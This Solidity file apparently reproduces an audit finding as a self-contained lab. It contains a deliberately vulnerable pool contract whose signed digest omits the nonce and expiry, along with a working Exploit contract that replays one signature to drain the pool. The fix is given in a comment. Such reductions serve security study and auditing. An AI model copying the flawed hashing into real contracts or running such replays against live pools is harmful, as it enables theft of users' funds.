// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Common Pool (RFX) — Signature does not bind nonce/expiry and can be reused
    (Halborn, finding #52006)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: checkReport hashes only the deposit payload; sig.expiry and
    sig.nonce are checked against wall-clock / orderNonce but are NOT part of the
    signed digest. Anyone who observes a used signature can re-submit it with a
    fresh nonce, replaying allocateFunds and draining more pool inventory.
    Vulnerable hashing line preserved (@> VULN). */

contract MockToken {
    string public constant name = "BTC";
    string public constant symbol = "BTC";
    uint8 public constant decimals = 8;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }
}

/// @dev Reduced CommonPool: signed allocate transfers `amount` of token to a market sink.
contract CommonPool {
    struct Signature {
        bytes signature;
        uint128 expiry;
        uint128 nonce;
    }

    string public constant DEPOSIT_STRUCT = "Deposit(bytes32 multicall)";
    MockToken public immutable token;
    address public immutable market;
    mapping(address => bool) public approvedSigner;
    uint256 public orderNonce;

    constructor(MockToken token_, address market_) {
        token = token_;
        market = market_;
    }

    function updateSigner(address s, bool ok) external {
        approvedSigner[s] = ok;
    }

    function allocateFunds(uint256 amount, Signature calldata sig) external {
        // ONLY the deposit payload is hashed — NOT sig.expiry / sig.nonce.
        bytes32 input = keccak256(abi.encode(keccak256(bytes(DEPOSIT_STRUCT)), amount)); // @> VULN: signed digest omits nonce and expiry — signature is reusable across nonces
        // FIX: input = keccak256(abi.encode(keccak256(bytes(DEPOSIT_STRUCT)), amount, sig.nonce, sig.expiry));

        checkReport(sig, input, orderNonce);

        orderNonce += 1;
        token.transfer(market, amount);
    }

    function checkReport(Signature calldata sig, bytes32 input, uint256 currentNonce) internal view {
        if (block.timestamp > sig.expiry) revert("InvalidTimestamp");
        if (uint256(sig.nonce) != currentNonce) revert("InvalidEpoch");

        bytes32 inputHash = constructHash(input);
        address recovered = _recover(inputHash, sig.signature);
        if (!approvedSigner[recovered]) revert("InvalidSignature");
    }

    function constructHash(bytes32 input) public pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", input));
    }

    function _recover(bytes32 ethSigned, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(ethSigned, v, r, s);
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    CommonPool public pool; // CREATE nonce 2 — vulnerable
    // market sink = address(this) so replayed deposits credit the Exploit

    // Precomputed offline: private key 0xA11CE
    // signer = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    // amount = 1000e8
    // input = keccak256(abi.encode(keccak256("Deposit(bytes32 multicall)"), amount))
    // ethSigned = keccak256("\x19Ethereum Signed Message:\n32" || input)
    // sig = sign(ethSigned) with --no-hash
    address public constant SIGNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;
    uint256 public constant AMOUNT = 1000e8;

    bytes32 constant R = 0x03c668c1af834a3b3b24e5136014d47b7d0042fdbcf4cc8f1324ecfdedc95d7a;
    bytes32 constant S = 0x5d8cc4902cac807161164888ac0d2ee8fde315230fbc48f7291e11e30a23d934;
    uint8 constant V = 27;

    constructor() {
        token = new MockToken();
        pool = new CommonPool(token, address(this));
        token.mint(address(pool), 2000e8); // inventory for two deposits
        pool.updateSigner(SIGNER, true);
    }

    function run() external {
        bytes memory sigBytes = abi.encodePacked(R, S, V);

        CommonPool.Signature memory depositSig = CommonPool.Signature({
            signature: sigBytes,
            expiry: uint128(block.timestamp + 1 days),
            nonce: uint128(pool.orderNonce())
        });

        uint256 marketBefore = token.balanceOf(address(this));

        // First legitimate allocate (nonce 0).
        pool.allocateFunds(AMOUNT, depositSig);
        require(pool.orderNonce() == 1, "nonce not advanced");
        require(token.balanceOf(address(this)) == marketBefore + AMOUNT, "first deposit missing");

        // Replay: same signature bytes + same amount, only nonce bumped to current.
        depositSig.nonce = uint128(pool.orderNonce());
        pool.allocateFunds(AMOUNT, depositSig);

        // HARM: pool inventory drained twice with a single signature.
        require(pool.orderNonce() == 2, "replay should advance nonce");
        require(token.balanceOf(address(this)) == marketBefore + 2 * AMOUNT, "replay drain failed");
        require(token.balanceOf(address(pool)) == 0, "pool should be empty");
    }
}
